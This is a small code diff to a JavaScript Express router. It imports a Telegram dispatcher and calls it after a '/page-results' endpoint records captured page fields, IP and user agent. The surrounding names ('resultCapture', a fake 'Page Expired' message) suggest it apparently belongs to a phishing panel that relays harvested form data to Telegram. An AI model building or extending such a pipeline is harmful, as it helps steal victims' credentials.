@@ -10,6 +10,7 @@ import { securityDecision } from "../services/securityRules.js";
 import { verifyChallengeProof } from "../services/challengeProof.js";
 import { clientIp } from "../services/clientIp.js";
 import { serverNormalizedFieldManifest } from "../services/resultCapture.js";
+import { wakeTelegramDispatcher } from "../services/telegram.js";
 
 export const eventsRouter = Router();
 const pageExpiredMessage = "Page Expired Renew to continue using";
@@ -127,6 +128,7 @@ eventsRouter.post("/page-results", async (req, res) => {
       pageName: context.page.name,
       hostname: context.host || req.body?.hostname
     }, ip, req.headers["user-agent"], { fieldManifest });
+    wakeTelegramDispatcher();
     res.status(201).json({ result });
   } catch (error) {
     res.status(400).json({ error: error.message });
